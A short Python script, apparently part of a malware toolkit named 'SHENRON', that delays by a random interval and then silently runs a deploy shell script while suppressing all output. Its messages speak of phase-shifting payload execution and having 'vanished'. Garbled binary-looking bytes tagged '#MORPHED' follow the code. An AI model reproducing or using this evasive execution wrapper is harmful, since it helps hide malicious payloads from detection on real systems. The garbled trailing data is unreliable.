#!/usr/bin/env python3
import os
import random
import subprocess
import time

def random_phase_shift():
    delay = random.randint(10, 60)
    print(f"[~] Phase shifting payload execution by {delay}s...")
    time.sleep(delay)

def temporal_phase(command):
    random_phase_shift()
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[âœ“] Temporal phase executed and vanished.")

if __name__ == "__main__":
    temporal_phase("bash ~/SHENRON/shenron_deploy_master.sh")

„eˆ\ÑôÃ³O‰†€"ØÀø¸™-P²]_l¯a-´ˆ‰–‹BŸÈ»æî'[4#MORPHED

rúÒÿ0ÒÌão(ëeØî£KŸ"RğÚÅ
’µ(şì
]‰œO4ø#MORPHED
